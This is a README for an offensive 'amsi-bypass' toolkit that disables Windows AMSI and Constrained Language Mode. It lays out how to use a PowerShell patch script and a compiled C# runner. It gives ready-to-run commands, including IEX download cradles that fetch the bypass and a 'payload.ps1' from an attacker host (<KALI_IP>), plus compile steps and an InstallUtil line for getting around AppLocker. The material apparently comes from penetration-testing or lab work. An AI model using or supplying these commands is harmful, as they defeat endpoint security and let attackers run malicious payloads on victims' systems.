# amsi-bypass

Two files. **Both standalone** — they are not dependent on each other. Pick one based on where you need to bypass AMSI.

---

## File Roles

| File | Standalone? | Language | When to use |
|------|-------------|----------|-------------|
| `ps-amsi-bypass.ps1` | Yes | PowerShell | Run this in your PS session before loading blocked scripts |
| `csharp-amsi-bypass.cs` | Yes | C# | When you need AMSI disabled from C# code, or CLM bypassed |

---

## ps-amsi-bypass.ps1 — In-Process PowerShell AMSI Patch

Run this in the **same PowerShell session** where you'll be running AMSI-blocked code. Contains 3 bypass methods — use whichever works in your environment.

**Usage:**
```powershell
# Option A — run the file
powershell -ExecutionPolicy Bypass -File .\ps-amsi-bypass.ps1

# Option B — download and run fileless
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/ps-amsi-bypass.ps1')

# After running, run your AMSI-blocked payload in the SAME session:
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/payload.ps1')
```

**AMSI bypass is per-session** — it only affects the current PowerShell process. A new PS window needs a new bypass.

---

## csharp-amsi-bypass.cs — C# CLM + AMSI Patch

Creates a new PowerShell runspace from C# that runs in FullLanguage mode (CLM bypassed), and also patches AMSI before opening the session. Useful when:
- PowerShell is in Constrained Language Mode (CLM)
- You need to run PS from C# code
- Combine with InstallUtil for AppLocker bypass

**Compile — Visual Studio (Windows dev box):**

1. **File → New → Project → Console App (.NET Framework)**
   - Name: `amsi`, Framework: **.NET Framework 4.8**
2. Delete defaults, paste in `csharp-amsi-bypass.cs`
3. **Right-click References → Add Reference → Browse**
   Navigate to: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`
   Click Add → OK
4. **Project → Properties → Build:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
5. **Build → Build Solution** (`Ctrl+Shift+B`)
6. Output: `bin\x64\Debug\amsi.exe`

**Alt (Windows cmd):**
```cmd
csc.exe /unsafe /platform:x64 /r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /out:amsi.exe csharp-amsi-bypass.cs
```

**Run:**
```cmd
:: Direct
.\amsi.exe

:: Via InstallUtil (if AppLocker blocks the .exe)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U amsi.exe
```

---

## Notes

- Run AMSI bypass **before** any AMSI-blocked code in the same session.
- If the PS bypass is detected/blocked, try a different method in the script (methods 1, 2, and 3 use different techniques).
- The C# version (`csharp-amsi-bypass.cs`) also patches CLM — use it when PS is in Constrained Language Mode AND AMSI is active.
